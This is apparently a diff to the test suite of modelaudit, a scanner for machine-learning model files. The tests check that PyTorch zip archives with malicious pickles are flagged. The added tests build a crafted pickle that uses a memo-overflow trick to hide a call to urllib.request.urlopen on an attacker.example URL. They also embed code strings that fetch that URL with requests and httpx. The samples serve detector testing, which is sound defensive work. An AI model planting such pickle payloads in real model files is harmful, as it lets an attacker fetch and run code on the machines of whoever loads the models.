@@ -23,7 +23,7 @@ from modelaudit.detectors.suspicious_symbols import CVE_COMBINED_PATTERNS
 from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME, Check, ScanResult, mark_inconclusive_scan_result
 from modelaudit.scanners.archive_dispatch import NESTED_SCAN_CALLBACK_CONFIG_KEY
 from modelaudit.scanners.base import CheckStatus, IssueSeverity
-from modelaudit.scanners.pickle_scanner import PickleScanner
+from modelaudit.scanners.pickle_scanner import _PYTORCH_LEGACY_MAX_TRACKED_MEMO_ENTRIES, PickleScanner
 from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner
 from tests.helpers import create_mock_pytorch_zip
 
@@ -8027,6 +8027,19 @@ def _short_binunicode(data: bytes) -> bytes:
     return b"\x8c" + bytes([len(data)]) + data
 
 
+def _memo_overflow_urlopen_payload() -> bytes:
+    overflow_index = _PYTORCH_LEGACY_MAX_TRACKED_MEMO_ENTRIES
+    return (
+        b"\x80\x04"
+        + (b"N\x94" * overflow_index)
+        + b"curllib.request\nurlopen\n"
+        + _short_binunicode(b"https://attacker.example/payload")
+        + b"\x940j"
+        + overflow_index.to_bytes(4, "little")
+        + b"\x85R."
+    )
+
+
 def _weights_only_analysis_check(result: ScanResult) -> Check:
     return next(check for check in result.checks if check.name == "CVE-2025-32434 Pickle Format Security Analysis")
 
@@ -8148,12 +8161,16 @@ def test_pytorch_zip_keeps_executable_network_pickle_literal_actionable(tmp_path
     )
 
 
-def test_pytorch_zip_keeps_imported_network_alias_url_actionable(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "from requests import get\nget('https://attacker.example/payload')",
+        "import os, httpx as h\nh.get('https://attacker.example/payload')",
+    ],
+)
+def test_pytorch_zip_keeps_imported_network_alias_url_actionable(tmp_path: Path, literal: str) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "network-alias-code.pt", with_pickle=False, prefix="archive")
-    payload = pickle.dumps(
-        {"loader": "from requests import get\nget('https://attacker.example/payload')"},
-        protocol=0,
-    )
+    payload = pickle.dumps({"loader": literal}, protocol=0)
     with zipfile.ZipFile(model_path, "a") as zipf:
         zipf.writestr("archive/data.pkl", payload)
 
@@ -8246,6 +8263,38 @@ def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> Non
         issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
         and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+
+
+def test_pytorch_zip_fails_closed_for_memo_overflow_url_reducer(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "memo-overflow-urlopen.pt", with_pickle=False, prefix="archive")
+    payload = _memo_overflow_urlopen_payload()
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
